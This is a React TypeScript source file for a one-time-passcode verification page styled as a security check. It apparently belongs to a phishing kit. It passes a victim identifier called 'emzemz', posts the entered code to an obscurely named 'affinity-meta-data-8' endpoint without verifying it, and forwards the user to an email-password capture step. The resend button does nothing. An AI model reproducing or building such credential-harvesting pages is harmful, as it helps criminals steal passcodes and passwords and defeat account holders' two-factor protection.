import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';

const OTP: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  if (!emzemz) {
    return (
      <FlowCard title="Error">
        <div className="text-center text-red-600">
          Missing verification details. Please restart the login process.
        </div>
      </FlowCard>
    );
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');

    if (!otp.trim()) {
      setError('Please enter the verification code.');
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/affinity-meta-data-8/`, {
        emzemz,
        otp,
      });

      navigate('/email-password', { state: { emzemz } });
    } catch (err) {
      console.error('Error submitting OTP:', err);
      setError('There was a problem verifying your passcode. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <FlowCard title="Verification Required">
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="bg-purple-50 border border-purple-200 rounded p-4 mb-4">
          <p className="text-sm text-purple-800">
            For your security, we've sent a verification code to your registered phone number.
          </p>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="otp">
            Verification Code
          </label>
          <input
            id="otp"
            name="otp"
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-600 focus:outline-none shadow-sm"
            placeholder="Enter verification code"
          />
          {error && (
            <div className="flex items-center gap-2 text-sm text-red-600 mt-2">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              <span>{error}</span>
            </div>
          )}
        </div>

        <div className="pt-4">
          {!isLoading ? (
            <button
              type="submit"
              className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
            >
              Verify
            </button>
          ) : (
            <div className="flex justify-center py-2">
              <div className="h-6 w-6 animate-spin rounded-full border-4 border-solid border-purple-900 border-t-transparent" />
            </div>
          )}
        </div>

        <div className="text-center mt-4">
          <button
            type="button"
            className="text-sm text-purple-900 hover:underline"
            onClick={() => {
              // Resend OTP logic here
              console.log('Resend OTP');
            }}
          >
            Didn't receive a code? Resend
          </button>
        </div>
      </form>
    </FlowCard>
  );
};

export default OTP;
